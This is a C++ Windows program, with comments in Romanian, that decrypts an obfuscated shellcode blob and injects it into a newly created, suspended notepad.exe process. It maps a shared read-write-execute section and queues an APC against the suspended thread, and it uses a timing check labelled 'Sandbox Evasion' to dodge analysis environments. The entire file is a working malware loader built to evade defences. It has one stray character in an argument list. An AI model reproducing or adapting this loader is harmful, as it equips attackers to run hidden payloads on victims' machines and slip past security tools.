#include <iostream>
#include <Windows.h>
#include <vector>
#include <time.h>

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

using NtCreateSection = NTSTATUS(NTAPI*)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
	IN OPTIONAL PLARGE_INTEGER MaximumSize,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN OPTIONAL HANDLE FileHandle);

using NtMapViewOfSection = NTSTATUS(NTAPI*)(
	IN HANDLE SectionHandle,
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG_PTR ZeroBits,
	IN SIZE_T CommitSize,
	IN OUT OPTIONAL PLARGE_INTEGER SectionOffset,
	IN OUT PSIZE_T ViewSize,
	IN DWORD InheritDisposition,
	IN ULONG AllocationType,
	IN ULONG Win32Protect);

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;

using NtUnmapViewOfSection = NTSTATUS(NTAPI*)(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress OPTIONAL);

typedef void (WINAPI* SleepFunctionPointer)(
	DWORD dwMilliseconds
);

char* Decrypt(char* rShellcode, int sShellcodeSize, unsigned char bKey) {

	sShellcodeSize = sShellcodeSize / 2;
	char* pShellcode = (char*)malloc((sShellcodeSize) * sizeof(char));

	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = rShellcode[i * 2];
	}

	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] ^ '\n') - '\\') & '\xFF';
	}

	for (size_t i = 0; i < sShellcodeSize / 2; i++) {
		char temp = pShellcode[i];
		pShellcode[i] = pShellcode[sShellcodeSize - i - 1];
		pShellcode[sShellcodeSize - i - 1] = temp;
	}

	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] ^ 'Q') - 'R') & '\xFF';
	}

	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] ^ bKey) - bKey) & '\xFF';
	}

	return pShellcode;
}

int main() {
	char rShellcode[] =
		"\xd8\x29\x6a\x23\x53\xbe\xcf\x84\x78\xe1\x25\x6c\xaf\xd6\xa2"
		"\xae\x2c\x52\x5c\x90\x55\x49\xa7\xf1\x5d\xf1\xae\xbb\x5d\xe9"
		"\xdf\xeb\xb8\xb3\x95\xa6\xe8\xdb\xae\x3c\x54\x87\x2d\x0c\x62"
		"\x3e\x06\x99\x03\x24\x7f\x5e\xb9\x0d\x95\x1c\xe8\x06\x35\xb7"
		"\xa9\x47\xee\xde\x2d\xb3\xd8\x12\x6a\x4d\x55\xc8\x55\x43\x55"
		"\xbb\x55\x8b\x8f\xa6\xec\x1f\x13\x03\x9f\x5a\x57\x7d\x2c\x09"
		"\x3c\x38\xec\x25\x2c\x1f\x55\x5d\x55\xd4\x35\xcb\x55\xfc\x95"
		"\x96\xa2\xf5\x2c\x45\xb7\x3b\xec\x13\x2d\x0d\x24\x89\xec\x0a"
		"\x2d\x1c\x82\xdb\xec\xae\x2d\x32\x5e\x20\x5e\x9a\x1e\x50\x2d"
		"\xee\xd8\x40\x6a\x78\x55\x36\x55\xfd\x55\x12\x55\x49\x88\x32"
		"\x5e\xf6\xc9\x9e\x5d\x7d\x57\x49\x2c\xdc\x55\xad\x55\x4f\x85"
		"\x14\x55\xf2\x95\x44\xa2\x40\x2c\x66\x85\xd0\x8f\x6b\x94\xc4"
		"\xc4\x30\xec\xb7\x2c\x32\x37\x3b\x15\xa1\xa7\x22\x5c\xf6\x5e"
		"\x22\x55\x91\x55\x9d\x55\xe1\x58\x8b\x8d\x1f\x67\xda\x26\xb0"
		"\x6f\xca\xb9\x99\xda\x02\x6a\xb9\x2d\x72\xd8\x9d\x6a\x49\x55"
		"\x2c\x55\x80\x55\x7e\x55\xc5\x75\x99\xf8\xd5\x25\xe9\x29\x80"
		"\x57\xb2\x2c\xea\x55\xc9\x55\xcc\x9e\x53\xed\xbf\x94\x67\xa2"
		"\xd6\x2d\xbf\x4a\x14\xb8\xd6\x95\x7e\xe8\x2d\xd8\xdc\x6a\x8e"
		"\x96\x66\x9d\x83\x63\xef\x40\x57\xaf\x49\xa2\x61\x2c\xff\x5e"
		"\x69\x5e\x8f\xac\x61\xe4\xcd\x20\xd1\xac\x1e\xe4\x9d\x20\x9c"
		"\x24\x16\xec\x72\x2d\x72\x37\xe6\x5e\x1d\x95\xf0\xe4\x84\x20"
		"\x4f\xd8\x4a\x6a\x77\x55\x02\x55\xd7\x55\xe8\x55\x39\xe3\x2c"
		"\xcb\x53\x23\xcb\xb8\xc9\x57\x12\x2c\x1e\x5c\x33\x14\x74\x69"
		"\x9e\xa7\x0c\x75\xf4\xec\xd5\x2c\xd4\x55\x9f\x55\xd4\xfe\xa4"
		"\xd5\x59\x0d\x7e\x5f\x35\x37\xcf\x4a\x32\xa7\x22\x24\xf4\xec"
		"\xcc\x2d\xcf\x0a\xd3\x87\x90\xa7\x2d\xa3\x48\xec\xd3\x2d\x8f"
		"\xd8\x75\x6a\xe6\xd6\xd9\xfb\x1d\x58\x2a\x26\xe5\xaf\xc0\xa2"
		"\xf7\x2c\x2b\x5e\x78\x5e\x81\x45\x87\x55\x44\x55\x0e\x55\x5f"
		"\x55\x50\xe9\x00\xcd\xd4\xff\x61\x55\x8d\x7d\xbe\x2d\x7b\x5e"
		"\x05\xac\x15\xe4\x07\x20\x3b\x5d\x33\x14\x82\x37\x1f\x5e\x18"
		"\x94\x70\xec\x92\x2d\xda\x55\x64\xa7\x54\xbb\xce\x0f\xb1\xbe"
		"\x85\xa4\x3e\x47\x69\x45\x15\x20\xf8\xbb\x46\x45\x6a\xbe\x04"
		"\x5e\x96\xbc\x73\x58\x0e\xa7\xd9\x37\x16\x2d\x2f\xbd\x67\x47"
		"\x68\x28\xd4\x0a\xf7\x2f\x4a\x14\x4a\xbd\xd0\x47\x57\x28\x68"
		"\x46\x76\xbd\xfa\xbe\x16\x0d\xbb\x5d\x11\x02\xad\xb8\xae\xa4"
		"\x24\x23\x88\xfd\x79\xf9\xfe\x23\x52\xa6\xdb\x97\x25\x0e\x43"
		"\xb2\xe5\xbe\x3c\x46\xf4\xbf\x45\x28\xd3\xb3\xd8\x97\x28\x5d"
		"\xce\x22\x0b\x59\xf5\xf9\xc5\x5a\x60\xbc\x59\x44\x3d\xfc\x97"
		"\x23\x27\x2f\x8a\x40\x59\xe5\x76\x5a\x2d\xbd\xd0\x01\xc2\x37"
		"\xc9\x97\xcd\x0c\x68\xa7\xd4\xe5\x49\x47\x6a\x23\x79\x29\x25"
		"\x2e\x08\x46\x61\xf4\x40\x5e\x14\x08\xb1\xfd\x3b\xbd\x6a\xbb"
		"\xa5\x5d\x11\xf4\x28\xf2\xc1\x28\x8c\x22\xd6\x2e\xa9\xf4\x0b"
		"\x00\x87\xba\x97\x45\x8c\xa5\x2f\x2e\xf1\xf9\x15\xf3\x1d\xff"
		"\x9a\x02\x95\xa4\xc1\x02\x9b\x23\xe1\xbb\xc0\xa7\x7e\xfe\xe9"
		"\xf4\xa8\x0f\x9a\x47\xa7\xfd\x86\x2e\xc2\x5a\xb5\xfe\x54\x47"
		"\xbf\x47\x9a\xba\xe7\x02\xd9\x2d\x23\xb2\xd1\x21\x55\xbc\x90"
		"\x58\x38\x08\x28\x0d\xd1\x02\xd9\x58\x6c\xa7\xa1\x29\x66\xa4"
		"\x5e\xbb\x4e\x0e\xe1\xbe\x30\xf4\x9c\xf3\xfe\x40\xd9\x5a\x71"
		"\x08\x9f\xba\xe2\xa7\xa5\x23\xe2\x59\x0c\xff\x9b\x03\xb4\x5c"
		"\x47\xf4\x65\xf4\x38\x5c\x2a\xb9\x46\x2e\x89\xb8\xa9\x2f\x82"
		"\x0f\x79\x0c\x7a\x40\x76\xbe\x78\x0d\xc2\x5c\x63\x44\xb1\x22"
		"\x26\x2f\xdf\xff\xda\x20\x29\x2c\x6d\xbb\x3e\x03\x62\x02\xe0"
		"\xba\x96\x5c\x12\xbc\x34\x2f\xbf\x53\x39\x5d\xa6\xfc\x3f\xf4"
		"\x89\x5f\x5e\x20\xf1\x02\x6d\x29\x0e\xfe\xe3\x23\x6c\x2f\x28"
		"\xb2\xa1\x14\x1e\xb2\x20\xa7\x1d\xa5\xcb\xf9\xc2\x58\x03\x5e"
		"\x3f\xba\x41\x01\x07\x23\x84\x08\x0f\x37\x14\x0c\x05\x58\x65"
		"\xb8\x1b\x08\x28\x0e\x61\x37\xc9\x52\xc5\x40\xe7\x0c\x2c\xfa"
		"\x8e\x55\x46\x55\x36\x55\x08\xad\xdc\x8d\xf3\xd8\xa8\x6a\x8d"
		"\x55\xfe\x55\xbe\x55\xf2\x55\xeb\xa3\x71\xca\xff\xec\xa0\x52"
		"\xd0\x57\x3b\x2c\x75\x5e\x06\x6e\x8c\xa7\x7e\x5e\x87\x5e\x78"
		"\xac\x73\xe4\x4d\x20\xd0\x55\xbe\x55\x82\x54\xbe\x56\xdb\x95"
		"\xc2\xa2\x46\x2c\x41\x94\x2b\xec\x8c\x2d\xfa\x37\x30\x55\x7f"
		"\xf9\x70\xf9\xf0\xfb\xa7\xfc\x54\xe5\x86\xe4\x32\xfb\x95\xfd"
		"\xaa\xf3\x5b\xe4\x68\xfb\x13\xff\x0b\xfc\xe6\xe4\xfc\x55\xf5"
		"\x55\xca\x55\xbe\x9a\x7d\x8d\x9f\xd8\x89\x6a\x8a\x55\x41\x55"
		"\x1b\x55\xfd\x55\xb8\xc2\x4f\xbc\x68\x53\xf6\xd7\x72\x57\x7b"
		"\x2c\x14\x5e\x99\x5e\xcd\xac\xd3\xe4\x0d\x20\xf0\x95\x44\xe4"
		"\x3a\x20\xb4\x37\xa6\x5e\x66\x74\x53\xec\x33\x2d\x0b\x5e\xcb"
		"\x5e\xa1\xd8\x10\x6a\x5e\x62\x4c\x43\xec\xb2\x03\x21\x4c\xaf"
		"\x73\xa2\xe6\x2c\x05\x74\xb4\xec\x31\x2d\x0e\x53\xaa\x14\xad"
		"\x55\xcf\xb9\xd5\x08\xb0\xbb\xca\x0c\x27\xbb\xff\x0c\xd8\xb2"
		"\x9d\xab\x14\x2c\x4d\x5e\xf4\xb6\x79\xe4\x27\x2d\x59\x50\x42"
		"\x6a\x7c\x6a\x9c\x6a\xc1\x46\xf8\x8c\xcd\x9f\x8c\x06\x87\x2d"
		"\x20\x37\x23\x5c\x64\x14\xb8\x5d\xa6\x75\x87\x6a\x95\x5f\x4c"
		"\x14\xb0\x35\x5a\x81\x8d\xee\x4e\x2d\x2d\x37\x99\x14\xe7\x5c"
		"\x3d\x14\xb1\x5d\x60\x14\xde\x37\xb1\x5c\x80\x0b\xad\x5d\x08"
		"\x14\x41\xc5\xe9\x54\x67\x2d\x41\x5d\xa5\x14\xd5\xed\x9f\x69"
		"\xe4\x06\x18\x14\x9f\xc5\x15\x54\x42\x2c\x00\x91\x26\x15\xfe"
		"\x06\x4c\x29\xd1\x2d\x21\x61\x04\x06\x93\x14\x2f\x03\xb3\xc5"
		"\x8f\x54\x73\x2c\x53\x49\x40\x15\x43\x06\x8a\x29\xaf\x5d\x7e"
		"\xdd\xca\xb8\x6f\xc4\xd5\xfc\xcf\x28\xd3\x6d\xa1\x49\x95\x21"
		"\xce\x6e\x5a\x21\xbe\x24\x65\xb8\x27\x75\x2a\xfd\xf6\x94\x07"
		"\x54\xad\x14\xa1\x60\xbe\xac\x65\x94\xa6\x14\xb4\xc1\xc9\x95"
		"\xc0\xe4\x69\x2d\x32\xd3\x34\x54\x09\x2d\x2c\xed\x4d\xf9\x01"
		"\x06\x8f\x14\x17\xac\x56\xe4\xc6\x20\xdb\xac\x9d\x6a\xc8\x2d"
		"\xa6\x53\xd8\x8e\x0b\xc5\x88\x54\x81\x2c\x38\x45\x61\x9d\x6b"
		"\x2d\x68\x06\x12\x35\x62\x15\xf9\x06\x54\x29\xd0\xc5\xe7\x54"
		"\x71\x2d\x17\x02\x48\xb9\x78\x95\x0d\xe8\x92\x2d\x29\x55\x1d"
		"\x55\x86\x55\x29\xed\x99\xd5\x72\x06\xdb\x55\x74\x55\x1c\x55"
		"\xfa\xbf\x4f\xe8\x37\x9a\xb8\x6f\xb5\x86\xb0\x9d\x95\xbd\x57"
		"\xd4\xf5\x03\xdf\xc5\x80\x54\x6c\x2d\x6d\xf1\x8d\x2f\x74\x06"
		"\xd9\x35\x8b\x5f\x43\x06\x65\x2d\x11\x44\x08\x14\xa5\x5f\xf6"
		"\x80\x79\x8f\xbd\x94\xf7\x54\xeb\x14\x15\x60\xb8\xac\xe0\x94"
		"\xe1\x14\x60\x35\x8f\x41\x6e\x6f\x3c\xb1\x7b\xf4\xf4\xf1\x5b"
		"\xc1\x62\x95\x8a\xe4\x8a\x2d\x8f\x45\x27\xbf\x5c\x06\xf7\x2d"
		"\xe5\xac\x87\xe4\x4a\x20\x3b\x47\x32\x47\x9b\x72\x61\x9a\x40"
		"\x2d\x84\x35\xc6\x5f\xc3\x06\xb1\x2d\xa7\x9d\x30\x5f\x4a\x06"
		"\x10\x2d\xee\xf5\x75\x5f\x6f\x06\x03\x2d\x2f\x08\x9e\x53\x6a"
		"\xdf\xef\xe4\x10\x2d\x50\x44\x9b\x5f\xc8\x45\x81\x14\x43\x44"
		"\x29\x14\x28\x55\x8a\x55\xf6\x55\xe9\xa1\x9e\x8d\x47\x25\xa1"
		"\x89\x81\xee\x48\x2d\x31\x31\x6c";
	DWORD shellcodeSize = 1508;

	// function import module
	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	HMODULE hUser = GetModuleHandle(L"kernel32.dll");

	NtCreateSection ntCreateSection = (NtCreateSection)
		GetProcAddress(hNtdll, "NtCreateSection");

	NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)
		GetProcAddress(hNtdll, "NtMapViewOfSection");

	NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)
		GetProcAddress(hNtdll, "NtUnmapViewOfSection");

	SleepFunctionPointer Sleep = (SleepFunctionPointer)
		GetProcAddress(hUser, "Sleep");

	// Sandbox Evasion
	int start = (int)time(NULL);
	Sleep(3000);
	int stop = (int)time(NULL);

	if ((stop - start) != 3){
		return 0;
	}

	//char* shellcode = Decrypt(rShellcode, shellcodeSize, '"');
	char* shellcode = Decrypt(rShellcode, shellcodeSize, '"');
	shellcodeSize /= 2;
	HANDLE hSection;
	LARGE_INTEGER szSection = { shellcodeSize };

	NTSTATUS status = ntCreateSection(
		&hSection, // handle-ul sectiunii
		SECTION_ALL_ACCESS,
		NULL,
		&szSection, // marimea sectiunii create
		PAGE_EXECUTE_READWRITE, // permisiuni - RWX
		SEC_COMMIT, // pornim atributul commit
		NULL);

	PVOID hLocalAddress = NULL;
	SIZE_T viewSize = 0;

	status = ntMapViewOfSection(
		hSection,
		GetCurrentProcess(), // specificam handle-ul procesului curent
		&hLocalAddress,
		NULL,
		NULL,
		NULL,
		&viewSize,
		ViewShare,
		NULL,
		PAGE_EXECUTE_READWRITE);

	RtlCopyMemory(hLocalAddress, shellcode, shellcodeSize);

	PVOID hRemoteAddress = NULL; // adresa preluata de sectiune, in cadrul procesului tinta

	LPSTARTUPINFOW       si;
	PPROCESS_INFORMATION pi;
	BOOL                 success;

	si = new STARTUPINFOW();
	si->cb = sizeof(LPSTARTUPINFOW);

	pi = new PROCESS_INFORMATION();

	wchar_t cmd[] = L"notepad.exe\0"; // procesul pe care il creem

	success = CreateProcess(
		NULL,
		cmd,
		NULL,
		NULL,
		FALSE, // daca handle-ul va fi mostenit de la procesul parinte
		CREATE_SUSPENDED,
		NULL,
		NULL,
		si, // pointer la STARTUPINFO sau STARTUPINFOEX - necesar
		pi); // pointer la PROCESS_INFORMATION - necesar

	status = ntMapViewOfSection(
		hSection,
		pi->hProcess, // specificam handle-ul procesului tinta
		&hRemoteAddress,
		NULL,
		NULL,
		NULL,+			
		&viewSize,
		ViewShare,
		NULL,
		PAGE_EXECUTE_READWRITE);

	QueueUserAPC(
		(PAPCFUNC)hRemoteAddress, // pointer catre functia executata ca shellcode
		pi->hThread, // handle-ul thread-ului
		0
	);

	ResumeThread(pi->hThread);

	status = ntUnmapViewOfSection(
		GetCurrentProcess(),
		hLocalAddress);

	std::cout << "[+] Created process with PID: " << pi->dwProcessId << std::endl;
	std::cout << "[+] Thread ID: " << pi->dwThreadId << std::endl;

	WaitForSingleObject(pi->hThread, INFINITE);

    return 0;
}